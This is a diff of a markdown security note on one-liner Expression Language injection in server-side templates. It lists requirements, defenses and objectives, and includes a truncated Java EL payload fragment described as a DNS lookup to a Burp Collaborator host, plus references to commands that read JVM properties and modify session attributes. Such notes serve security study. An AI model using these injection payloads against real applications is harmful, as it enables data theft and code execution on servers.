@@ -24,11 +24,15 @@ One-Liner Expression Language Injection is a technique used to inject malicious 
 
 One-Liner Expression Language Injection is a technique used to inject malicious expressions into server-side templates that use Expression Language (EL). EL is a simple language used to inject dynamic content into templates. One-Liner injections are a type of EL injection that do not require code execution. Instead, they use existing functions and objects within the target application to perform malicious actions. This technique can be used to extract sensitive data, manipulate the application's behavior, or even execute code on the server.
 
+ 
+
 ## Requirements
 
 1. Access to the target application's server-side templates
 
 1. Knowledge of the target application's use of EL
+
+ 
 
 ## Defense
 
@@ -38,6 +42,8 @@ One-Liner Expression Language Injection is a technique used to inject malicious 
 
 1. Monitor application logs for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Extract sensitive data from the target application
@@ -46,12 +52,20 @@ One-Liner Expression Language Injection is a technique used to inject malicious 
 
 1. Execute code on the server
 
+ 
+
 # Instructions
 
 1. Use these commands to perform DNS Lookup, JVM System Property Lookup, and modify session attributes.
 
+ 
+
+
+
 **Code**: [[// DNS Lookup
 ${"".getClass().forName("java.net.In]]
+
+
 
 > The first command can be used to perform a DNS lookup by invoking the 'getByName' method of the 'InetAddress' class. Replace 'xxxxxxxxxxxxxx.burpcollaborator.net' with the hostname you want to lookup.
 
@@ -64,3 +78,5 @@ The third command can be used to modify session attributes by invoking the 'setA
 - [[Expression Language EL]]
 - [[Expression Language EL - One-Liner injections not including code execution]]
 - [[Server Side Template Injection]]
+
+
